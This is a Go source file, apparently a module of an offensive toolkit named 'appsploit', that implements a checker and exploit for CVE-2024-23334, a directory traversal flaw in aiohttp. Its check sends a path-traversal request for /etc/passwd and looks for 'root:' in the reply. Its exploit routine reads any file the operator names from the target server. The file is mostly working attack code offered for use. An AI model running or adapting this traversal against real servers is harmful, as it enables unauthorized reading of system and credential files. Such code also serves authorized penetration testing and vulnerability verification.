package cve_2024_23334

import (
	"appsploit/pkg/utils"
	"strings"

	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"

	"github.com/urfave/cli/v2"
)

var (
	aliases     = []string{"23334", ""}
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, nil, true)
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, nil)
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, nil, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "CVE-2024-23334",
		Description: "Aiohttp Directory Traversal - Type: Arbitrary File Read",
		Level:       vul.LevelHigh,
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.Remote,
			Check:   exeenv.Remote,
			Exploit: exeenv.Remote,
		},
		CheckSecPrerequisites:    nil,
		ExploitablePrerequisites: nil,
	},
}

func (v *vulnerability) CheckSec(context *cli.Context) (vulnerabilityExists bool, err error) {
	baseURL := utils.Http.FormatURL(context)
	if resp, err := utils.Http.Get(baseURL + "/static/../../../../../../../../../etc/passwd"); err != nil {
		return false, err
	} else {
		if strings.Contains(resp, "root:") {
			v.VulnerabilityExists = true
		} else {
			v.VulnerabilityExists = false
		}
	}
	return v.BaseVulnerability.CheckSec(context)
}

func (v *vulnerability) Exploit(context *cli.Context) error {
	baseURL := utils.Http.FormatURL(context)
	filename := context.String("file")
	if !strings.HasPrefix(filename, "/") {
		filename = "/" + filename
	}
	if vulnerabilityExists, err := v.CheckSec(context); err != nil {
		return err
	} else {
		if vulnerabilityExists {
			if resp, err := Exploit(baseURL, filename); err != nil {
				return err
			} else {
				v.VulnerabilityResponse = resp
				return nil
			}
		}
	}
	return nil
}
